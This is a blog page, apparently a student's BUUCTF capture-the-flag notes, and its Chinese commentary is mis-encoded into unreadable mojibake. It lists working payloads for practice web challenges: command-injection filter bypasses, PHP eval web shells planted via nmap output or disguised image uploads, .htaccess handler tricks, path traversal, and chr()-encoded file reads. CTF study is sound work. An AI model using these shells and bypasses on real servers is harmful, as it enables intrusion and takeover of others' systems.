<!DOCTYPE html>
<html lang="zh-CN">

<head>

  <!-- Minima -->
  <!-- Hexo theme created by @adisaktijrs -->

  <!-- Basic Page Needs
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta charset="utf-8">

  
  <title>Buuctfåˆ·é¢˜ç¬”è®°</title>
  
  <link rel="canonical" href="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
  
  <meta name="description" content="å‘½ä»¤æ³¨å…¥[ACTF2020 æ–°ç”Ÿèµ›]Exec1127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#x3D;ls&amp;#x3D;&amp;#x3D;				cdè½¬ç›®å½•;lsæŸ¥çœ‹ç›®å½• 127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#">
  
  
  <meta name="author" content="Ja1e">
  
  
  
  <meta property="og:site_name" content="Ja1e" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="Buuctfåˆ·é¢˜ç¬”è®°" />
  
  <meta property="og:description" content="å‘½ä»¤æ³¨å…¥[ACTF2020 æ–°ç”Ÿèµ›]Exec1127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#x3D;ls&amp;#x3D;&amp;#x3D;				cdè½¬ç›®å½•;lsæŸ¥çœ‹ç›®å½• 127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#">
  
  <meta property="og:url" content="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" />

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Buuctfåˆ·é¢˜ç¬”è®°">
  
  <meta name="twitter:description" content="å‘½ä»¤æ³¨å…¥[ACTF2020 æ–°ç”Ÿèµ›]Exec1127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#x3D;ls&amp;#x3D;&amp;#x3D;				cdè½¬ç›®å½•;lsæŸ¥çœ‹ç›®å½• 127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#">
  
  
  
  
  <meta name="twitter:url" content="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" />

  <!-- Mobile Specific Metas
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Preload fonts
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>

  <!-- CSS
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/skeleton.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
<link rel="stylesheet" href="/css/prism-dark.css">

  
<link rel="stylesheet" href="/css/prism-line-numbers.css">

  <!-- User css -->
  
  
<link rel="stylesheet" href="/css/user.css">

  

  <!-- Favicon
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

  <!-- Custom Theme Color Style
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <style>
  a:not(.icon) {
    text-decoration-color: #0FA0CE;
    background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0) 50%,
      #0FA0CE 50%
    );
  }
  blockquote {
    border-left: 8px solid #0FA0CE;
  }
  .nanobar .bar {
    background: #0FA0CE;
  }
  .button.button-primary:hover,
  button.button-primary:hover,
  input[type="submit"].button-primary:hover,
  input[type="reset"].button-primary:hover,
  input[type="button"].button-primary:hover,
  .button.button-primary:focus,
  button.button-primary:focus,
  input[type="submit"].button-primary:focus,
  input[type="reset"].button-primary:focus,
  input[type="button"].button-primary:focus {
    background-color: #0FA0CE;
    border-color: #0FA0CE;
  }
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="search"]:focus,
  input[type="text"]:focus,
  input[type="tel"]:focus,
  input[type="url"]:focus,
  input[type="password"]:focus,
  textarea:focus,
  select:focus {
    border: 1px solid #0FA0CE;
  }
</style>

  <!-- Google Analytics (With Privacy Settings On)
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  

  
  <script src="/js/pic.min.js" defer></script>
  

  

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div class="container">
    <div class="row">
      <div>

        <div class="row">
  <div class="two columns" style="max-width: 50px">
    <h1 class="mt-2 mode">
      <div onclick=setDarkMode(true) id="darkBtn">ğŸŒ‘</div>
      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>â˜€ï¸</div>
      <script >
        if (localStorage.getItem('preferredTheme') == 'dark') {
          setDarkMode(true)
        }
        function setDarkMode(isDark) {
          var darkBtn = document.getElementById('darkBtn')
          var lightBtn = document.getElementById('lightBtn')
          if (isDark) {
            lightBtn.style.display = "block"
            darkBtn.style.display = "none"
            localStorage.setItem('preferredTheme', 'dark');
          } else {
            lightBtn.style.display = "none"
            darkBtn.style.display = "block"
            localStorage.removeItem('preferredTheme');
          }
          document.body.classList.toggle("darkmode");
        }
      </script>
    </h1>
  </div>

  <div class="six columns ml-1">
    <h1 class="mt-2">
      Hi Folks.
    </h1>
  </div>

  <div class="twelve columns">
    <div class="row">
      <div class="nine columns left">
        <a href="/">Home</a>
        
          
          <a href="/about" class="ml">About</a>
          
        
        
      </div>
    </div>
    <hr style="margin-bottom: 2.6rem">
  </div>
</div>
<link rel="stylesheet" href="/js/prism/prism.css">
        <div class="trans">
            <h2>Buuctfåˆ·é¢˜ç¬”è®°</h2>

  <h1 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h1><h4 id="ACTF2020-æ–°ç”Ÿèµ›-Exec1"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec1" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec1"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec1</h4><p>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;&#x3D;&#x3D;ls&#x3D;&#x3D;				cdè½¬ç›®å½•;lsæŸ¥çœ‹ç›®å½•</p>
<p>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;&#x3D;&#x3D;cat&#x3D;&#x3D; flag	  cdè½¬ç›®å½•;catæŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<hr>
<h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><pre class="line-numbers language-none"><code class="language-none">é€šè¿‡urlä¼ å‚è¿›è¡Œpingæ“ä½œ

?ip&#x3D;127.0.0.1;ls				   å‘ç°ç›®æ ‡æ–‡ä»¶flag.php

?ip&#x3D;127.0.0.1;cat falg.php		   æ— æ³•æŸ¥çœ‹ï¼Œè¿‡æ»¤äº†ç©ºæ ¼

?ip&#x3D;127.0.0.1;cat$IFS$1flag.php    ä½¿ç”¨$IFS$1è¿‡æ»¤ç©ºæ ¼ï¼Œä½†è¿˜æ˜¯æ— æ³•æŸ¥çœ‹

?ip&#x3D;127.0.0.1;cat$IFS$1index.php   å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼ˆåŒ…æ‹¬flagï¼‰

è§£å†³æ–¹æ¡ˆï¼š

?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php   åˆ©ç”¨$aå‚æ•°æ›¿æ¢gï¼Œç»•è¿‡flagè¿‡æ»¤;flagåœ¨ç½‘é¡µæºä»£ç ä¸­

?ip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;            æŠŠlsçš„ç»“æœå½“cat çš„å‚æ•°ç›´æ¥æŸ¥çœ‹,flagåœ¨ç½‘é¡µæºä»£ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h4><p>çŸ¥é“nmapå¯ä»¥å†™æ–‡ä»¶å³å¯	&#x3D;&#x3D;-oG&#x3D;&#x3D;</p>
<p><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code></p>
<p>ç„¶åè®¿é—®<code>/hack.phtml</code></p>
<p>èšå‰‘é“¾æ¥ï¼Œæ‹¿<code>flag</code></p>
<hr>
<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>æŸ¥çœ‹æºä»£ç å‘ç°source.phpç›´æ¥è®¿é—®</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$_page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°æœ‰ä¸ªhint.phpï¼Œé‚£å°±å…ˆçœ‹çœ‹hint</p>
<p>payload:	?file&#x3D;hint.php</p>
<p>å‘ç°flagåœ¨ffffllllaaaaggggé‡Œ</p>
<p>payload:	?file&#x3D;source.php&#x3D;&#x3D;%253f&#x3D;&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p>
<hr>
<h4 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h4><p>è®¿é—®index.php.bakæ–‡ä»¶ï¼Œä¸‹è½½æºç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 	 <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼±ç›¸ç­‰ï¼Œç›´æ¥ä¸Šä¼ <code>?key=123</code></p>
<hr>
<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h4><p>è¿‡æ»¤äº†â€˜?&gt;â€™ï¼Œé‚£å°±æ¢ä¸ªé©¬ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åç¼€åä¹Ÿè¿‡æ»¤ï¼Œé‚£å°±ç”¨phtml</p>
<p>ä¸Šä¼ æ—¶æŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶ç±»å‹image&#x2F;jpeg</p>
<p>èœåˆ€è¿æ¥ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p>
<hr>
<h4 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h4><p>é¦–å…ˆjsç»•è¿‡ï¼Œç›´æ¥æŠŠjs è„šæœ¬åˆ æ‰</p>
<p>ç„¶åä¸Šä¼ 4.phtml,å†…å®¹å’Œæå®¢é‚£é¢˜ä¸€æ ·</p>
<p>ä¸Šä¼ æ—¶æŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶ç±»å‹image&#x2F;jpeg</p>
<p>èœåˆ€è¿æ¥ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p>
<hr>
<h4 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h4><p>å…ˆä¸Šä¼ .htaccess</p>
<p>å†…å®¹ä¸ºSetHandler application&#x2F;x-httpd-php</p>
<p>å†ä¸Šä¼ å°é©¬.jpgæ ¼å¼</p>
<hr>
<h4 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h4><p>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè¦æŠ“åŒ…æ”¹æ–‡ä»¶ç±»å‹</p>
<p>å†ä¸Šä¼ .jpgæ–‡ä»¶ï¼Œä¸èƒ½å‡ºç°&lt;?ï¼Œæ‰€ä»¥ç”¨</p>
<p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;1&#39;]);&lt;/script&gt;</code></p>
<p>ç„¶åè¿æ¥èšå‰‘å³å¯</p>
<hr>
<h4 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h4><p>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè¦æŠ“åŒ…æ”¹æ–‡ä»¶ç±»å‹ï¼ŒåŒæ—¶è¦å†™ä¸Š<code>é­”æœ¯å¹»å¤´</code></p>
<p>åœ¨ä¸Šä¼ å°é©¬å›¾ç‰‡ï¼Œè¿æ¥èšå‰‘å³å¯</p>
<hr>
<h1 id="PHPå­—ç¬¦ä¸²è§£ææ¼æ´"><a href="#PHPå­—ç¬¦ä¸²è§£ææ¼æ´" class="headerlink" title="PHPå­—ç¬¦ä¸²è§£ææ¼æ´"></a>PHPå­—ç¬¦ä¸²è§£ææ¼æ´</h1><p>chr(47)â€”â€”<code>/</code><br>chr(102)â€”â€”<code>f</code><br>chr(49)â€”â€”<code>1</code><br>chr(97)â€”â€”<code>a</code><br>chr(103)â€”â€”<code>g</code></p>
<hr>
<h4 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h4><p>ç›´æ¥1+1æŠ“åŒ…å‘ç°calc.phpæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®</p>
<pre class="line-numbers language-none"><code class="language-none">PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF

è¾“å…¥æ—¶å‘ç°numåªèƒ½è¾“å…¥æ•°å­—ï¼Œè¾“å…¥å­—ç¬¦æ— æ³•è§£æã€‚
PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆå˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1ï¼Œåˆ é™¤ç©ºç™½å­—ç¬¦ï¼›2ï¼Œå°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰

ç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x3D;&#x3D;scandir()&#x3D;&#x3D;å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„</p>
<p>&#x3D;&#x3D;var_dump()&#x3D;&#x3D;ï¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯</p>
<p>? num&#x3D;1;var_dump(scandir(chr(47)))	æ‰«æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ˜¯scandir(â€œ&#x2F;â€œ),ä½†æ˜¯â€œ&#x2F;â€è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨chr(â€œ47â€)ç»•è¿‡      </p>
<p>? num&#x3D;1;var_dump(&#x3D;&#x3D;file_get_contents&#x3D;&#x3D;(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))  è¯»å–è¿™ä¸ªæ–‡ä»¶</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h4><p>ç‚¹å‡»èœå•æ çš„buyflag</p>
<p>æŠ“åŒ…å‘ç°phpä»£ç ï¼Œçœ‹</p>
<p>ä¼ å‚ä¸ºpasswordå’Œmoney</p>
<p>å°†cookieçš„user&#x3D;0æ”¹ä¸ºuser&#x3D;1</p>
<p>ä»¥POSTä¼ å‚password&#x3D;404a&amp;money&#x3D;1e9</p>
<p>æ³¨æ„åœ¨httpå¤´éƒ¨è¦å¢åŠ Content-Type: application&#x2F;x-www-form-urlencoded</p>
<hr>
<h4 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h4><p>è¿™é¢˜æ‰“å¼€çœ‹sourceæºä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span>
